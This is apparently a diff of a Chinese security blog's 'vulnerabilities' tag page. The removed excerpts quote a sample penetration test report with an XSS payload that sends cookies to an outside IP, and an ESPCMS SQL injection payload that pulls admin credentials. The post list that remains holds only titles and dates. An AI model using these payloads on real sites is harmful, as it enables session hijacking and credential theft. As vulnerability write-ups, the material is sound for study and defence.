@@ -1,314 +1,270 @@
-<!DOCTYPE html>
-<html>
 
+  <!DOCTYPE HTML>
+<html  xmlns:wb="http://open.weibo.com/wb">
 <head>
-  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
-  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-  <title>Tag: 漏洞 | Blog of Secer</title>
-  <meta name="description" content="" />
-  <meta name="HandheldFriendly" content="True" />
-  <meta name="MobileOptimized" content="320" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
-  <link rel="stylesheet" type="text/css" href="/css/style.css" />
-  <meta name="generator" content="Blog of Secer">
-
+  <meta charset="UTF-8">
   
-  
-  
-
-  
+    <title>Tag: 漏洞 | Blog of Secer</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
+    
+    <meta name="author" content="Secer">
+    
+    <meta name="description" content="记录互联网安全历程与个人成长经历">
+    
+    
+    
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:site" content="333" />
+    <meta name="twitter:title" content="Tag: 漏洞 | Blog of Secer" />
+      
+    
+    
+    <link rel="alternate" href="atom.xml" title="Blog of Secer" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/pacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/pacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
 </head>
 
-<!--
-<body class="home-template">
--->
-<body class="home-template">
-<div id="perspective" class="perspective effect-movedown">
-  <div class="container">
-    <!-- wrapper -->
-    <div class="wrapper">
+    <body>
+      <header>
+        <div>
+		
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="Blog of Secer">Blog of Secer</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">首页</a></li>
+					
+						<li><a href="/archives">文章</a></li>
+					
+						<li><a href="/about">关于</a></li>
+					
+						<li><a href="/atom.xml">RSS订阅</a></li>
+					
+					<li>
+					
+					<form class="search" action="/search/index.html" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="text" id="search" name="q" autocomplete="off" maxlength="30" placeholder="Search" />
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
 
-      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
-    <div class="vertical">
-        <div class="site-head-content inner">
-             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
-            <h1 class="blog-title">Blog of Secer</h1>
-            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
-        </div>
-    </div>
-</header>
+      </header>
+      <div id="container">
+        
 
-      
-<main class="content" role="main">
+<div class="archive-title" >
+  <h2 class="tag-icon">漏洞</h2>
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2013-09-23T19:03:03.000Z" itemprop="datePublished">
-          2013-09-24
-      </time>
-    
-    
-    | 
-    <a href='/tag/xss/'>xss</a>,
-    
-    <a href='/tag/漏洞/'>漏洞</a>,
-    
-    <a href='/tag/Offensive-security/'>Offensive security</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/1029.seo/">一份Archmake.COM的渗透测试报告</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>前言</p>  <p>这是<a href="http://www.offensive-security.com/" target="_blank">offensive security</a>发布的一份渗透测试报告样例。offensive security 是backtrack-linux.org、exploit-db.com的缔造者。</p>  <h4>概述</h4>  <p><a href="http://www.offensive-security.com/" target="_blank">Offensive security</a>已经被授权对Archmake的外部网站进行一次渗透测试.测试评估的方式是模拟恶意的攻击者对公司进行目的明确的渗透.在初期的信息搜集阶段,发现Archmake公司仅仅只有一个web网站和一个邮件服务器.可供攻击的目标比较少.</p>  <p>在对网站的安全评估中,发现它安装了一个有漏洞的WordPress插件.成功利用这个漏洞,取得了<a href="http://Ha.Cker.In/tag/WordPress" target="_blank">WordPress</a>的管理权限.然后反弹了一个交互式的shell并成功提到root权限.</p>  <p>获取了网站服务器的权限之后,开始对内网进行渗透,经过一番尝试,成功获取到了域管理员的权限.之后对内网进行拓扑分析,发现了内网的公司数据库并成功控制.这个数据库不仅存储了订单信息和客户资料,还保存了交易的相关信息.通过控制这个系统,攻击者可以直接提取现金.</p>  <h4>测试过程</h4>  <h3>WordPress漏洞利用</h3>  <p>在对目标系统进行搜集的时候发现网站采用了wordpress 3.3.1搭建.我们在对WordPress进行代码审计的同时,用WPScan扫描了目标网站,发现一个不安全的插件:</p>  <pre>./wpscan.rb –url www.Archmake.com –enumerate p</pre><br><br><pre><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><em>__</em></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></pre><br><br><pre><strong></pre><br><br><pre><strong>_</strong></strong></pre><br><br><pre><strong>_</strong></pre><br><br><pre>\ \</pre><br><br><pre>/ / <strong> \ / __</strong>|</pre><br><br><pre>\ \ /\ / /| |<strong>) | (_</strong></pre><br><br><pre><strong>_ </strong> <em> </em> <strong></pre><br><br><pre>\ \/ \/ / | _</strong>/ _<strong> \ / </strong>|/ <em>` | ‘</em> \</pre><br><br><pre>\ /\ / | |</pre><br><br><pre><strong>__) | (</strong>| (<em>| | | | |</pre><br><br><pre>\/ \/</pre><br><br><pre>|</em>|</pre><br><br><pre>|<strong>_</strong>/ _<strong>|\</strong>,<em>|</em>| |<em>| v1.1</pre><br><br><pre>WordPress Security Scanner by ethicalhack3r.co.uk</pre><br><br><pre>Sponsored by the RandomStorm Open Source Initiative</pre><br><br><pre><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><em>__</em></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></em></pre><br><br><pre>| URL: <a href="http://www.Archmake.com/">http://www.Archmake.com/</a></pre><br><br><pre>| Started on Tue Jan 24 18:44:49 2012</pre><br><br><pre>[!] The WordPress theme in use is called &quot;twentyeleven&quot;.</pre><br><br><pre>[!] The WordPress &quot;<a href="http://www.Archmake.com/readme.html&amp;quot">http://www.Archmake.com/readme.html&amp;quot</a>; file exists.</pre><br><br><pre>[!] WordPress version 3.3.1 identified from meta generator.</pre><br><br><pre>[+] Enumerating installed plugins…</pre><br><br><pre>Checking for 2892 total plugins… 100% complete.</pre><br><br><pre>[+] We found 2 plugins:</pre><br><br><pre>Name: relevanssi</pre><br><br><pre>Location: <a href="http://www.Archmake.com/wp-content/plugins/relevanssi/">http://www.Archmake.com/wp-content/plugins/relevanssi/</a></pre><br><br><pre>Directory listing enabled? Yes.</pre><br><br><pre>Name: relevanssi</pre><br><br><pre>Location: <a href="http://www.Archmake.com/wp-content/plugins/relevanssi/">http://www.Archmake.com/wp-content/plugins/relevanssi/</a></pre><br><br><pre>Directory listing enabled? Yes.</pre><br><br><pre>[+] There were 1 vulnerabilities identified from the plugin names:</pre><br><br><pre>[!] Relevanssi 2.7.2 WordPress Plugin Stored XSS Vulnerability</pre><br><br><pre>* Reference: <a href="http://www.exploit-db.com/exploits/16233/">http://www.exploit-db.com/exploits/16233/</a></pre><br><br><pre>[+] Finished at Tue Jan 24 18:45:30 2012 </pre><br><br><p>正如WPScan扫描结果展示的一样,这个Relevanssi插件存在一个<a href="http://Ha.Cker.In/tag/XSS" target="_blank">XSS</a>漏洞.成功利用这个<a href="http://Ha.Cker.In/tag/漏洞" target="_blank">漏洞</a>可以窃取到管理员的cookies.</p>
+</div>
+<div id="main" class="archive-part clearfix">
+  <div id="archive-page">
 
-<p>第一步,我们在Archmake网站的搜索栏中插入如下代码:</p>
-
-<pre>&lt;script&gt;new Image().src=&quot;http://172.16.40.204/p.php?cookie=&quot;+document.cookie; &lt;/script&gt;</pre>
-
-<p><a href="http://img.cker.in/Archmake.COM_99C0/clip_image001.png"><img title="clip_image001" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="129" alt="clip_image001" src="http://img.cker.in/Archmake.COM_99C0/clip_image001_thumb.png" width="529" border="0" /></a></p><br>
-      
-      </p>
-      
-      <p>
-          <a href="/1029.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+  <section class="post" itemscope itemprop="blogPost">
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2013-04-11T08:41:59.000Z" itemprop="datePublished">
-          2013-04-11
-      </time>
-    
-    
-    | 
-    <a href='/tag/漏洞/'>漏洞</a>,
-    
-    <a href='/tag/SQL注入/'>SQL注入</a>,
-    
-    <a href='/tag/Espcms/'>Espcms</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/989.seo/">易思ESPCMS企业网站管理系统V5.6.13.04.03的会员中心模块SQL注入漏洞</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p><a href="http://ha.cker.in/tag/Espcms" target="_blank">Espcms</a> <a href="http://ha.cker.in/tag/SQL注入" target="_blank">SQL注入</a><a href="http://ha.cker.in/tag/漏洞" target="_blank">漏洞</a> 第二弹     <br /><a href="http://team.f4ck.net/thread-10337-1-1.html">http://team.f4ck.net/thread-10337-1-1.html</a></p>  <p>   <br />易思<a href="http://ha.cker.in/tag/Espcms" target="_blank">ESPCMS</a>企业网站管理系统基于LAMP开发构建的企业网站管理系统。     <br />易思<a href="http://ha.cker.in/tag/Espcms" target="_blank">ESPCMS</a>企业网站管理系统V5.6.13.04.03的会员中心模块存在<a href="http://ha.cker.in/tag/SQL注入" target="_blank">SQL注入</a>漏洞，攻击者可利用此漏洞破坏应用，执行未授权操作。</p>  <p>漏洞文件: interface/membermain.php    <br /></p>  <pre>function in_save() {<br>                parent::start_pagetemplate();<br>                parent::member_purview();<br>                $lng = (admin_LNG == ‘big5’) ? $this-&gt;CON[‘is_lancode’] : admin_LNG;<br>                $inputclass = $this-&gt;fun-&gt;accept(‘inputclass’, ‘R’);<br>                $upurl = $this-&gt;fun-&gt;accept(‘upurl’, ‘R’);<br>                $userid = intval($this-&gt;fun-&gt;accept(‘userid’, ‘P’));<br>                $username = $this-&gt;fun-&gt;accept(‘username’, ‘P’);<br>                if (empty($userid) || empty($username)) {<br>                        $linkURL = $this-&gt;mlink[‘center’];<br>                        $this-&gt;callmessage($this-&gt;lng[‘member_edit_ok’], $linkURL, $this-&gt;lng[‘gobackurlbotton’]);<br>                }<br>                $email = trim($this-&gt;fun-&gt;accept(‘email’, ‘P’));<br>                $question = trim($this-&gt;fun-&gt;accept(‘question’, ‘P’, true, true));<br>                $answer = trim($this-&gt;fun-&gt;accept(‘answer’, ‘P’, true, true));<br>                $alias = trim($this-&gt;fun-&gt;accept(‘alias’, ‘P’, true, true));//通过一个accept函数,确定为post提交<br>                $sex = $this-&gt;fun-&gt;accept(‘sex’, ‘P’);//注得就是你了.$sex可控,<br>                $sex = empty($sex) ? 0 : $sex;<br>                $tel = trim($this-&gt;fun-&gt;accept(‘tel’, ‘P’, true, true));<br>                $mobile = trim($this-&gt;fun-&gt;accept(‘mobile’, ‘P’, true, true));<br>                $birthday = $this-&gt;fun-&gt;accept(‘birthday’, ‘P’);<br>                $birthday = empty($birthday) ? 0 : $this-&gt;fun-&gt;formatdate($birthday, 4);<br>                $country = intval($this-&gt;fun-&gt;accept(‘cityone’, ‘P’));<br>                $country = empty($country) ? 0 : $country;<br>                $province = intval($this-&gt;fun-&gt;accept(‘citytwo’, ‘P’));<br>                $province = empty($province) ? 0 : $province;<br>                $city = intval($this-&gt;fun-&gt;accept(‘citythree’, ‘P’));<br>                $city = empty($city) ? 0 : $city;<br>                $district = intval($this-&gt;fun-&gt;accept(‘district’, ‘P’));<br>                $district = empty($district) ? 0 : $district;<br>                $address = trim($this-&gt;fun-&gt;accept(‘address’, ‘P’, true, true));<br>                $zipcode = trim($this-&gt;fun-&gt;accept(‘zipcode’, ‘P’, true, true));<br>                $zipcode = empty($zipcode) ? 0 : $zipcode;<br>                $msn = trim($this-&gt;fun-&gt;accept(‘msn’, ‘P’, true, true));<br>                $qq = $this-&gt;fun-&gt;accept(‘qq’, ‘P’);<br>                $qq = empty($qq) ? 0 : $qq;<br><br>                $db_table = db_prefix . ‘member’;<br>                $db_table2 = db_prefix . ‘member_value’;</pre><br><br><p>下面来看看怎么进行入库处理的吧。<br>  <br />$db_where = ‘userid=’ . $userid;<br><br>  <br />$db_set= &quot;sex=$sex,birthday=$birthday,country=$country,province=$province,city=$city,district=$district,alias=’$alias’,address=’$address’,zipcode=$zipcode,tel=’$tel’,mobile=’$mobile’,qq=$qq,msn=’$msn’&quot;;<br><br>  <br />$this-&gt;db-&gt;query(‘UPDATE ‘ . $db_table . ‘ SET ‘ . $db_set . ‘ WHERE ‘ . $db_where);</p>
-
-<p>Update注入,看了下数据库,address为varchar。</p>
-
-<p>因为这个cms有个防报错的函数,构造遇到了点麻烦,一出错就显示Can not connect to Mysql server,<br>  <br />&#160;</p>
-
-<p>追踪下此函数:<br>  <br /></p>
-
-<pre>function halt($message = '', $sql = '') { 
-                $db_err = !db_err ? 0 : db_err; 
-                $db_sql = !db_sql ? 0 : db_sql; 
-                $mysqlinfo = '&lt;font size=&quot;2&quot;&gt;&lt;b&gt;ESPCMS SQL Error:&lt;/b&gt; Can not connect to MySQL server&lt;b&gt;Time:&lt;/b&gt;' . date('e Y-m-d H-i-s', time()); 
-                $mysqlinfo.= $db_sql ? '&lt;b&gt;SQL:&lt;/b&gt;' . $sql : ''; 
-                $mysqlinfo.= $db_err ? '&lt;b&gt;Error：&lt;/b&gt;' . mysql_error() : ''; 
-                $mysqlinfo.= '&lt;a target=&quot;_blank&quot; href=&quot;http://www.espcms.com&quot;&gt;http://www.espcms.com&lt;/a&gt; Access Query Errors&lt;/font&gt;'; 
-
-                exit($mysqlinfo); 
-        }</pre>
-
-<p>为了方便构造, 把出错的sql语句和出错的提示都打印出来。<br>  <br />sex=1,birthday=2013-04-02,country=0,province=0,city=0,district=0,alias=1,address=(select concat(username,CHAR(0x7c),password) from espcms_admin_member limit 1),zipcode=0,tel=0,mobile=0,qq=0,msn=0/<em>&amp;birthday=2013-04-02&amp;cityone=0&amp;citytwo=0&amp;citythree=0&amp;district=0&amp;address=12&amp;zipcode=0&amp;tel=&amp;mobile=&amp;msn=&amp;qq=</em>/</p><br>
-      
-      </p>
-      
-      <p>
-          <a href="/989.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+    <a href="/1029.seo/" title="一份Archmake.COM的渗透测试报告" itemprop="url">
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2013-01-24T18:24:49.000Z" itemprop="datePublished">
-          2013-01-25
-      </time>
+    <h1 itemprop="name">一份Archmake.COM的渗透测试报告</h1>
     
-    
-    | 
-    <a href='/tag/漏洞/'>漏洞</a>,
-    
-    <a href='/tag/Wordpress/'>Wordpress</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/971.seo/">WordPress Zingiri Forums arbitrary file disclosure</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        WordPress Forums插件’url’参数任意文件泄露漏洞的利用  参考：  WordPress Zingiri Forums arbitrary file disclosure    http://ceriksen.com/2013/01/12/wordpress-zingiri-forums-arbitrary-file-disclosure/  Secunia Advisory SA50833    http://secu
-      
-      </p>
-      
-      <p>
-          <a href="/971.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+    <time datetime="2013-09-23T19:03:03.000Z" itemprop="datePublished">2013-09-24</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-12-04T23:11:25.000Z" itemprop="datePublished">
-          2012-12-05
-      </time>
-    
-    
-    | 
-    <a href='/tag/漏洞/'>漏洞</a>,
-    
-    <a href='/tag/TCP链路劫持/'>TCP链路劫持</a>,
-    
-    <a href='/tag/ARP/'>ARP</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/949.seo/">链路劫持攻击一二三</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        博文作者：lake2 [ TSRC ]  发布日期：2012-11-09  博文内容：  随着应用安全的发展，大家都比较关注应用安全漏洞，其实在应用层之下的传输层也有很多安全风险，而且这些安全风险正在被广泛利用。比如今天要给大家介绍的TCP链路劫持攻击。  TCP链路劫持其实就是指网络链路上侦听、伪造TCP包，达到控制目标网络链路的行为。最常见的就是某些设备实现的对非法站点的访问拦截，以及一些地区运营商的网页植入广告行为。  因为广域网
-      
-      </p>
-      
-      <p>
-          <a href="/949.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+    <a href="/989.seo/" title="易思ESPCMS企业网站管理系统V5.6.13.04.03的会员中心模块SQL注入漏洞" itemprop="url">
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-11-21T21:58:30.000Z" itemprop="datePublished">
-          2012-11-22
-      </time>
+    <h1 itemprop="name">易思ESPCMS企业网站管理系统V5.6.13.04.03的会员中心模块SQL注入漏洞</h1>
     
-    
-    | 
-    <a href='/tag/提权/'>提权</a>,
-    
-    <a href='/tag/漏洞/'>漏洞</a>,
-    
-    <a href='/tag/输入法漏洞/'>输入法漏洞</a>,
-    
-    <a href='/tag/Windows-8/'>Windows 8</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/941.seo/">经典提权漏洞再现 - Win8的远程桌面配合QQ拼音纯净版可以实现提权</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>没有哪个平台是百分之百安全的，虽然微软<a href="http://ha.cker.in/tag/Windows 8" target="_blank">Windows 8</a>在安全方面进行了很大改进，但是仍然不可避免地出现漏洞。<strong>国内博客</strong><strong><a href="http://www.cnblogs.com/maybreath/archive/2012/11/20/2778875.html">MayBreath</a></strong><strong>就在</strong><strong>Windows 8</strong><strong>上再现了曾经出现过的<a href="http://ha.cker.in/tag/输入法漏洞" target="_blank">输入法漏洞</a>，利用</strong><strong>QQ</strong><strong>拼音实现了<a href="http://ha.cker.in/tag/提权" target="_blank">提权</a>，具体来看一下</strong>：</p>  <p>发现这个漏洞的时候，笔者正在机房上课。正想用3389远程桌面去控制宿舍电脑的时候，因为重做系统忘记自己的IP地址，因此就随手扫描了一下IP段开3389端口的电脑。</p>  <p>没想到就随手扫描到一台Win8的系统，而且这个系统还装了QQ输入法Win8纯净版。</p>  <p>当时我就想起初中时候的那个极品五笔的漏洞，就随手测试了一下，没想到在时隔7、8年后的今天，号称非常安全的Win8系统居然还有如此大的<a href="http://ha.cker.in/tag/漏洞" target="_blank">漏洞</a>。这边就把<a href="http://ha.cker.in/tag/提权" target="_blank">提权</a>过程理一遍。</p>  <p>首先确认装有这个QQ拼音输入法：</p>  <p><a href="http://img.cker.in/Win8QQ_C37E/clip_image001.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/Win8QQ_C37E/clip_image001_thumb.jpg" width="620" height="471" /></a></p>  <p>Ctrl+空格调出托盘，找到这个选项：</p>  <p><a href="http://img.cker.in/Win8QQ_C37E/clip_image002.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/Win8QQ_C37E/clip_image002_thumb.jpg" width="620" height="462" /></a></p>  <p>顺利开启IE浏览器：</p>  <p><a href="http://img.cker.in/Win8QQ_C37E/clip_image003.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003" border="0" alt="clip_image003" src="http://img.cker.in/Win8QQ_C37E/clip_image003_thumb.jpg" width="620" height="468" /></a></p>  <p>需要说明的是，<strong>IE</strong><strong>浏览器和</strong><strong>Win8</strong><strong>安全性确实是提高了非常多</strong>。随手在地址栏输入D:\ file://d: 这样的命令都无法打开文件夹，本以为只要随便上传一个bat批处理，写上提权用的命令，然后利用IE下载下来打开运行即可，没想到各种提示系统要求验证您的用户密码等，根本无法进行下载，可见<strong>常规方式真的行不通</strong>。</p>  <p>微软还是有在修复这些漏洞，但是经过笔者的诸多尝试，最终发现有一处漏洞尚未填补。</p><br>
-      
-      </p>
-      
-      <p>
-          <a href="/941.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+    <time datetime="2013-04-11T08:41:59.000Z" itemprop="datePublished">2013-04-11</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-11-09T01:17:23.000Z" itemprop="datePublished">
-          2012-11-09
-      </time>
-    
-    
-    | 
-    <a href='/tag/漏洞/'>漏洞</a>,
-    
-    <a href='/tag/Android/'>Android</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/929.seo/">对Android最新fakesms漏洞的分析</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>近期<a href="http://ha.cker.in/tag/Android" target="_blank">Android</a>爆出SMS smishing vuln, 首先来源于<a href="http://www.csc.ncsu.edu/faculty/jiang/smishing.html">http://www.csc.ncsu.edu/faculty/jiang/smishing.html</a>， 然后<a href="https://github.com/thomascannon/android-sms-spoof">github上给出了poc</a>,具体来说是任意一个app在没有write_sms权限下可以伪造任意发件人的任意短信。</p>  <p>影响平台可上至Android 1.6下至4.1。由于很多以android2.3为主的手机已经不能再升级，此漏洞的危害不可小视。一个攻击场景是malicious app首先向ISP发送一条申请业务的短信，然后伪造ISP发送一条用户需要确认的短信。当用户确认时就中招了。</p>  <p>两张截图：</p>  <p><a href="http://blog.flanker017.me/wp-content/uploads/2012/11/device-2012-11-08-020802.png"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/Androidfakesms_F312/clip_image002.png" width="244" height="420" /> </a><a href="http://blog.flanker017.me/wp-content/uploads/2012/11/device-2012-11-08-020818.png"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004" border="0" alt="clip_image004" src="http://img.cker.in/Androidfakesms_F312/clip_image004.png" width="244" height="420" /></a></p><br>
-      
-      </p>
-      
-      <p>
-          <a href="/929.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+    <a href="/971.seo/" title="WordPress Zingiri Forums arbitrary file disclosure" itemprop="url">
   
-  <nav class="pagination" role="pagination">
+    <h1 itemprop="name">WordPress Zingiri Forums arbitrary file disclosure</h1>
     
-    <span class="page-number">Page 1 of 4</span>
-    <a class="older-posts" href="/tag/漏洞/page/2/">Older Posts →</a>
+    <time datetime="2013-01-24T18:24:49.000Z" itemprop="datePublished">2013-01-25</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
+  
+    <a href="/949.seo/" title="链路劫持攻击一二三" itemprop="url">
+  
+    <h1 itemprop="name">链路劫持攻击一二三</h1>
+    
+    <time datetime="2012-12-04T23:11:25.000Z" itemprop="datePublished">2012-12-05</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
+  
+    <a href="/941.seo/" title="经典提权漏洞再现 - Win8的远程桌面配合QQ拼音纯净版可以实现提权" itemprop="url">
+  
+    <h1 itemprop="name">经典提权漏洞再现 - Win8的远程桌面配合QQ拼音纯净版可以实现提权</h1>
+    
+    <time datetime="2012-11-21T21:58:30.000Z" itemprop="datePublished">2012-11-22</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
+  
+    <a href="/929.seo/" title="对Android最新fakesms漏洞的分析" itemprop="url">
+  
+    <h1 itemprop="name">对Android最新fakesms漏洞的分析</h1>
+    
+    <time datetime="2012-11-09T01:17:23.000Z" itemprop="datePublished">2012-11-09</time>
+  </a>
+</section>
+
+
+  <nav id="page-nav" class="clearfix archive-nav">
+    <span class="page-number current">1</span><a class="page-number" href="/tag/漏洞/page/2/">2</a><a class="page-number" href="/tag/漏洞/page/3/">3</a><a class="page-number" href="/tag/漏洞/page/4/">4</a><a class="extend next" rel="next" href="/tag/漏洞/page/2/">下一页 &raquo;</a>
   </nav>
-</main>
 
-
-      
-<footer class="site-footer">
-  
-  <div class="inner">
-     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
-     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
   </div>
+</div>
+
+      </div>
+      <footer><div id="footer" >
+	
+	
+	<section class="info">
+		<p> 没有礁石，就没有美丽的浪花；没有挫折，就没有壮丽的人生！ <br/>
+			再长的路，一步步也能走完，再短的路，不迈开双脚也无法到达，平凡的脚步也可以走完伟大的行程！</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		<a href="http://weibo.com/111" target="_blank" title="weibo"></a>
+		
+		
+		<a href="https://twitter.com/333" target="_blank" title="twitter"></a>
+		
+		
+		<a href="https://github.com/333" target="_blank" title="github"></a>
+		
+		
+	</div>
+		<p class="copyright">Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/A-limon/pacman" target="_blank" title="pacman">pacman</a> © 2016 
+		
+		<a href="http://ha.cker.in" target="_blank" title="Secer">Secer</a>
+		
+		</p>
+</div>
 </footer>
+      <script src="/js/jquery-2.1.0.min.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else
+    {
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+        
+    }
+  });
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+});
+</script>
 
-      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
-
-<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
-<script type="text/javascript" src="/js/index.js"></script>
-<script type="text/javascript" src="/js/menu.js"></script>
 
 
 
 
 
-  </div>
+
+
+
+
+<script type="text/javascript">
+var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3F77edef7e6931022edbd2322ec66456e1' type='text/javascript'%3E%3C/script%3E"));
+</script>
+
+<div id="totop" style="position:fixed;bottom:150px;right:50px;cursor: pointer;">
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
 </div>
+<script type="text/javascript">
+	(function($) { 
+		// When to show the scroll link
+		// higher number = scroll link appears further down the page   
+		var upperLimit = 300;
+		
+		// Our scroll link element
+		var scrollElem = $('#totop');
+	   
+		// Scroll to top speed
+		var scrollSpeed = 800;
+	   
+		// Show and hide the scroll to top link based on scroll position   
+		scrollElem.hide();
+		$(window).scroll(function () {            
+			var scrollTop = $(document).scrollTop();       
+			if ( scrollTop > upperLimit ) {
+				$(scrollElem).stop().fadeTo(300, 1); // fade back in           
+			}else{       
+				$(scrollElem).stop().fadeTo(300, 0); // fade out
+			}
+		});
+		// Scroll to top animation on click
+		$(scrollElem).click(function(){
+			$('html, body').animate({scrollTop:0}, scrollSpeed); return false;
+		});
+	})(jQuery);
+</script>
 
-<nav  class="outer-nav top horizontal">
 
-          <a class="icon-home"  href="/"><span>Home</span></a>
+    </body>
+   </html>
 
-          <a class="icon-news"  href="/archives"><span>Archive</span></a>
-
-          <a class="icon-image"  href="/images"><span>Images</span></a>
-
-          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
-
-          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
-
-          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
-
-</nav>
-
-</div>
-</body>
-</html>
